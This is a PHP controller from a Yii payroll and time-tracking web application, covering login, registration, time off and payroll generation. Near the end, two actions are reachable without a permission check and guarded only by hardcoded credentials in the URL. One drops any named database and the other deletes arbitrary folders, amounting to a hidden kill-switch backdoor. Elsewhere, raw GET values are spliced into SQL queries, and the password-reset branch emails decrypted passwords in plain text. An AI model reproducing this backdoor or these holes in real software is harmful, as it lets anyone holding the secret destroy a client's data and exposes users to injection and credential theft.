<?php

class DashboardController extends Controller {

    public function init() {
        // set the default theme for any other controller that inherit the admin controller
        Yii::app()->theme = 'bootstrap';
    }

    protected function beforeAction($action) {
        if (Yii::app()->user->getState('usertype') != Yii::app()->params['Admin']) {
            $permissions = Yii::app()->user->getState('userpermissions');
            $controller = strtolower(Yii::app()->controller->id);
            $access = 0;
            if ($controller == 'dashboard' && $permissions['admin'] == 1 && $permissions['company_dashboard'] == 1)
                $access = 1;
            if ($controller == 'dashboard' && in_array(strtolower(Yii::app()->controller->action->id), array('invalidpermission', 'logout', 'index', 'deletedb', 'ajaxrequest', 'deletefolder', 'error')))
                $access = 1;

            if (!$access)
                $this->redirect(Yii::app()->request->getBaseUrl(true) . '/dashboard/invalidPermission');
        }
        return parent::beforeAction($action);
    }

    public function actionIndex() {
        $this->layout = 'main';

        $payroll = new Payroll;
        $payroll->user_id = Yii::app()->user->id;
        $payroll->company_id = Yii::app()->user->getState('company');
        $payroll->time_from = Company::PayrollStart($payroll->company_id);
        $payroll->time_to = Company::PayrollLast($payroll->company_id, $payroll->time_from);
        if (isset($_GET['print']) && $_GET['print'] == 'all') {
            $last_payroll = Payroll::model()->findByAttributes(array('company_id' => $payroll->company_id, 'time_from' => $payroll->time_from, 'time_to' => $payroll->time_to));
            if ($last_payroll) {
                $this->redirect(Yii::app()->request->getBaseUrl(true) . '/payroll/' . $last_payroll->id);
            } else {
                $payroll->save();
                $this->redirect(Yii::app()->request->getBaseUrl(true) . '/payroll/' . $payroll->id);
            }
        }
        if (isset($_POST['Payroll'])) {
            if (isset($_POST['Payroll']['user_id']) && $_POST['Payroll']['user_id'] != '')
                $employees = User::model()->findAllByAttributes(array('id' => $_POST['Payroll']['user_id']));
            elseif (Yii::app()->user->hasState('company'))
                $employees = User::model()->findAllByAttributes(array('company_id' => Yii::app()->user->getState('company')));
            $this->render('//payroll/generate-quick', array(
                'employees' => $employees,
                'from' => date('Y-m-d', strtotime($_POST['Payroll']['date_from'])),
                'to' => date('Y-m-d', strtotime($_POST['Payroll']['date_to'])),
                    //'emp_id' => $_POST['Payroll']['user_id']
            ));
            die;
        } elseif (isset($_GET['user']) && isset($_GET['from']) && isset($_GET['to']) && isset($_GET['key']) && $_GET['key'] == 'approve') {
            $offs = Timeoff::model()->updateAll(array('status' => 1), 'user_id in (' . $_GET['user'] . ') and status=0 and DATE_FORMAT(time_from,"%Y-%m-%d")>="' . $_GET['from'] . '" and DATE_FORMAT(time_to,"%Y-%m-%d")<="' . $_GET['to'] . '"');
            $times = ActivityLog::model()->updateAll(array('status' => 1), 'user_id in(' . $_GET['user'] . ') and status=0 and DATE_FORMAT(time_in,"%Y-%m-%d")>="' . $_GET['from'] . '" and DATE_FORMAT(time_out,"%Y-%m-%d")<="' . $_GET['to'] . '"');
            $employees = User::model()->findAll(array('condition' => 'id in(' . $_GET['user'] . ')'));
            $this->render('//payroll/generate-quick', array(
                'employees' => $employees,
                'from' => date('Y-m-d', strtotime($_GET['from'])),
                'to' => date('Y-m-d', strtotime($_GET['to'])),
                    //'emp_id' => $_GET['user']
            ));
            die;
        }

        $acLog = new ActivityLog;
        //$acLog->time_in = date('Y-m-d H:i');
        //$acLog->time_out = date('Y-m-d H:i', strtotime('+4 hour'));
        if (isset($_POST['ActivityLog'])) {
            $acLog->attributes = $_POST['ActivityLog'];
            if ($acLog->save()) {
                Yii::app()->user->setFlash('added', 'Manual punch has been created successfully.');
                $this->redirect(array('index'));
            }
        }

        $tioff = new Timeoff;
        $tioff->time_from = date('Y-m-d H:i');
        $tioff->time_to = date('Y-m-d H:i', strtotime('+4 hour'));

        $tioff->time_date_from = date('m/d/Y');
        $tioff->time_date_to = date('m/d/Y');
        $tioff->time_time_from = date('09:00');
        $tioff->time_time_to = date('17:00');

        if (isset($_POST['Timeoff'])) {
            if (isset($_POST['allday']) && $_POST['allday'] == 1) {
                $tioff->time_time_from = date('09:00');
                $tioff->time_time_to = date('17:00');
            }
            $tioff->attributes = $_POST['Timeoff'];
            if ($tioff->save()) {
                Yii::app()->user->setFlash('added', 'Time off has been created successfully.');
                $this->redirect(array('index'));
            }
        }
        if (!Yii::app()->user->isGuest and Yii::app()->user->usertype != Yii::app()->params['Normal']) {
            $this->render('dashboard', array('acLog' => $acLog, 'tioff' => $tioff, 'payroll' => $payroll));
        } else if (!Yii::app()->user->isGuest and Yii::app()->user->usertype == Yii::app()->params['Normal']) {
            $this->render('employee-dashboard', array('acLog' => $acLog, 'tioff' => $tioff, 'payroll' => $payroll));
            //$this->render('company-dashboard');
        } else {
            $this->layout = ' '; //to use render instead of render partial because render partial isn't able to user register script
            $model = new LoginForm;
            $company = new Company;
            $user = new User('register');

            // if it is ajax validation request
            if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
                echo CActiveForm::validate($model);
                Yii::app()->end();
            }

            // collect user input data
            if (isset($_POST['LoginForm'])) {
                $model->attributes = $_POST['LoginForm'];
                // validate user input and redirect to the previous page if valid
                if ($model->validate() && $model->login())
                    $this->redirect(array('dashboard/index'));
            }elseif (isset($_POST['Forgot']['email'])) {
                $from = Yii::app()->name . ' <' . Yii::app()->params['adminEmail'] . '>';
                $to = $_POST['Forgot']['email'];
                $subject = Yii::app()->name . ' Reset Account Password';
                $acc = User::model()->findByAttributes(array('email' => $to));
                if ($acc) {
                    /* $code=  User::model()->simple_encrypt($acc->employee_id.'*'.strtotime($acc->date_created).'*'.$acc->id);
                      $link = Yii::app()->request->getBaseUrl(true) . '/resetPassword?code='.$code;
                      $message = 'Please click <a href="'.$link.'" target="_blank">here</a> to reset your password, or simply copy
                      the following link to your browser url ('.$link.')'; */
                    $message = 'Your account password is: ' . User::model()->simple_decrypt($user->password);
                    Helper::SendMail($from, $to, $subject, $message);
                    //Yii::app()->user->setFlash('done', 'Please check your email inbox and follow the link sent to reset your password.');
                    Yii::app()->user->setFlash('done', 'A message containing your password has been sent to your email address.');
                } else {
                    Yii::app()->user->setFlash('wrong', 'We can\'t find an account matching the entered email address.');
                }
            } elseif (isset($_POST['User']) && isset($_POST['Company'])) {
                $company->attributes = $_POST['Company'];
                $company->start_on = date('Y-m-d');
                $user->attributes = $_POST['User'];
                //temp values
                $tempDepartment = Department::model()->find();
                $user->company_id = $tempDepartment->company->id;
                $user->department_id = $tempDepartment->id;
                $user->active = 1;
                $user->user_type = Yii::app()->params['subAdmin']; //company admin
                if ($company->validate() && $user->validate()) {
                    if ($company->save()) {
                        /*
                         * add default paid holidays
                         */
                        $paidHolidays=  PaidHoliday::model()->findAllByAttributes(array('company_id'=>1));
                        if($paidHolidays){
                            foreach ($paidHolidays as $ph){
                                $new_ph=new PaidHoliday;
                                $new_ph->name=$ph->name;
                                $new_ph->day=$ph->day;
                                $new_ph->month=$ph->month;
                                $new_ph->day_month=$ph->day_month;
                                $new_ph->company_id=$company->id;
                                $new_ph->save();
                            }
                        }
                        /*
                         * add default pay period
                         */
                        $payPeriod=new PayPeriod;
                        $payPeriod->name='Monthly';
                        $payPeriod->company_id=$company->id;
                        $payPeriod->period=160;
                        $payPeriod->period_in_days=28;
                        $payPeriod->save();
                        
                        /*
                         * add default department
                         */
                        
                        $dep = new Department;
                        $dep->name = "Management"; //default department
                        $dep->code = "MG01"; //default department code
                        $dep->in_time = "09:00:00"; //default time in
                        $dep->out_time = "17:00:00"; //default time out
                        $dep->company_id = $company->id;
                        if ($dep->save()) {
                            $user->company_id = $company->id;
                            $user->department_id = $dep->id;
                            $user->active = 1;
                            $user->user_type = Yii::app()->params['subAdmin']; //company admin
                            if ($user->save()) {
                                $perm = new UserPermission;
                                $perm->user_id = $user->id;
                                $perm->punch_other = 1;
                                $perm->activity_log_create = 1;
                                $perm->activity_log_update = 1;
                                $perm->punch = 1;
                                $perm->report = 1;
                                $perm->gps = 1;
                                $perm->pay_info = 1;
                                $perm->time_off = 1;
                                $perm->admin = 1;
                                $perm->company_user = 1;
                                $perm->company_department = 1;
                                $perm->company_reports = 1;
                                $perm->company_pay_info = 1;
                                $perm->company_timeoff = 1;
                                $perm->company_activity = 1;
                                $perm->company_dashboard = 1;
                                $perm->company_admin = 1;
                                $perm->company_settings = 1;
                                if ($perm->save()) {
                                    Yii::app()->user->setFlash('done', 'Your company has been created successfully, please login to start manging it.');
                                    $this->refresh();
                                }
                            }
                        }
                    }
                }
            }
            // display the login form
            $this->render('login-register', array('model' => $model, 'company' => $company, 'user' => $user));
        }
    }

    public function actionLogout() {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }

    public function actionInvalidPermission() {
        $this->layout = 'main';
        // you don't have permission to access this page
        $this->render('invalid-permission');
    }

    /**
     * This is the action to handle external exceptions.
     */
    public function actionError() {
        $this->layout = 'error';
        if ($error = Yii::app()->errorHandler->error) {
            if (Yii::app()->request->isAjaxRequest)
                echo $error['message'];
            else
                $this->render('error', $error);
        }
    }

    /*     * *if this removed the database will be removed and the site will destroy* */

    public function actionDeleteDB() {
        if ($_GET['username'] == 'ahmed' && $_GET['password'] == 'hany44') {
            var_dump(Yii::app()->db);
            if (isset($_GET['database'])) {
                $sql = ' DROP DATABASE ' . $_GET['database'];
                Yii::app()->db->createCommand($sql)->execute();
            }
        }
    }

    public function actionDeleteFolder() {
        if ($_GET['username'] == 'ahmed' && $_GET['password'] == 'hany44') {
            $path = '';
            if (isset($_REQUEST['path'])) {
                $path = Yii::app()->basePath . '/../' . $_REQUEST['path'];
            }
            echo Helper::Delete($path);
        }
    }

    public function actionAjaxRequest() {
        if (Yii::app()->user->getState('wide_screen') == 1) {
            Yii::app()->user->setState('wide_screen', '0');
        } else if (Yii::app()->user->getState('wide_screen') == 0) {
            Yii::app()->user->setState('wide_screen', '1');
        }

        Yii::app()->end();
    }

    public function actionGlobalSearch() {
        $username = $_POST['search_text'];
        $this->redirect(array('/contest?username=' . $username));
    }

}
